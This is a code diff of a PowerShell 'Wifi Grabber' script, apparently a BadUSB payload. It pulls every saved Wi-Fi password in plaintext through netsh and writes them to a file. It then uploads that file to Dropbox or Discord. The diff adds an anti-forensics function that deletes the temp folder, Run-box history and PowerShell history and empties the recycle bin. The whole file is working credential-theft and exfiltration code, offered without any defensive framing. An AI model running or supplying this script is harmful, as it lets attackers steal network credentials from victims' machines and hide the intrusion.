@@ -1,31 +1,42 @@
-# Wifi Grabber
+Write-Host "Script started"
 
-# Get wifi profiles and passwords
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
-    $name=$_.Matches.Groups[1].Value.Trim()
-    netsh wlan show profile name="$name" key=clear
-} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
-    $pass=$_.Matches.Groups[1].Value.Trim()
-    [PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }
-} | Format-Table -AutoSize | Out-String
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
-# Save wifi profiles to data.txt file in /badusb/data directory
-$wifiProfiles | Out-File -Encoding utf8 -FilePath "$($env:USERPROFILE)\Documents\badusb\data\data.txt"
+Write-Host "Wi-Fi profiles gathered:"
+Write-Host $wifiProfiles
 
-# Upload output file to Dropbox or Discord if the URLs are provided
-if (-not ([string]::IsNullOrEmpty($db))) {
+$wifiProfiles | Out-File -Encoding utf8 -FilePath '.\data\data.txt'
+
+Write-Host "Wi-Fi profiles saved to file"
+
+# Upload output file to Dropbox or Discord
+
+if (-not ([string]::IsNullOrEmpty($db))){
     Write-Host "Uploading to Dropbox..."
-    DropBox-Upload -f "$($env:USERPROFILE)\Documents\badusb\data\data.txt"
+    DropBox-Upload -f '.\data\data.txt'
     Write-Host "Upload to Dropbox completed"
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))) {
+if (-not ([string]::IsNullOrEmpty($dc))){
     Write-Host "Uploading to Discord..."
-    Upload-Discord -file "$($env:USERPROFILE)\Documents\badusb\data\data.txt"
+    Upload-Discord -file '.\data\data.txt'
     Write-Host "Upload to Discord completed"
 }
 
-# Clean exfiltration traces if the option is specified
+function Clean-Exfil { 
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+# Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+}
+
 if (-not ([string]::IsNullOrEmpty($ce))) {
     Write-Host "Cleaning exfiltration traces..."
     Clean-Exfil
